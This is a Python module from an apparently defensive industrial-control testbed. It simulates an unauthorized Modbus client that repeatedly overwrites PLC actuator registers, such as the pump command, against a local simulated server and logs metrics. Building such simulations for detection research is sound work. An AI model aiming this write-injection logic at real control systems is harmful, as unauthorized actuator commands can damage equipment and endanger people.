"""
Attack Scenario 1: Unauthorized Register Write.
Simulates a rogue or compromised host writing to critical PLC registers (e.g., pump command).
"""

import time
from typing import Optional
from .base import BaseAttack
from twinguard.modbus.client import TwinGuardModbusClient
from twinguard.modbus.registers import REG_PUMP_COMMAND, REG_VALVE_COMMAND, REG_CONTROL_MODE


class UnauthorizedWriteAttack(BaseAttack):
    """
    Connects as an unauthorized Modbus client and injects unapproved actuator commands.
    """

    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 5020,
        target_register: int = REG_PUMP_COMMAND,
        target_value: int = 1,
        spoofed_source_ip: str = "192.168.1.99",
        duration_sec: float = 10.0,
    ) -> None:
        super().__init__(
            name="unauthorized_write",
            description="Unauthorized client writes to critical control registers without PLC authorization.",
            target_host=target_host,
            target_port=target_port,
            duration_sec=duration_sec,
        )
        self.target_register = target_register
        self.target_value = target_value
        self.spoofed_source_ip = spoofed_source_ip

    def execute(self) -> None:
        client = TwinGuardModbusClient(host=self.target_host, port=self.target_port)
        if not client.connect():
            self.metrics["error"] = "Failed to connect to simulation Modbus server"
            return

        end_time = time.time() + self.duration_sec
        try:
            while not self._stop_event.is_set() and time.time() < end_time:
                # Read current state first
                state = client.read_process_state()
                old_val = state.get("pump_command") if self.target_register == REG_PUMP_COMMAND else 0

                # Inject unauthorized write
                success = client.write_register_raw(address=self.target_register, value=self.target_value)
                if success:
                    self.events_injected += 1
                    self.metrics["last_write"] = {
                        "register": self.target_register,
                        "old_value": old_val,
                        "new_value": self.target_value,
                        "source": self.spoofed_source_ip,
                        "true_level": state.get("true_level"),
                        "timestamp": time.time(),
                    }
                time.sleep(0.5)
        finally:
            client.close()
            self.metrics["total_writes"] = self.events_injected
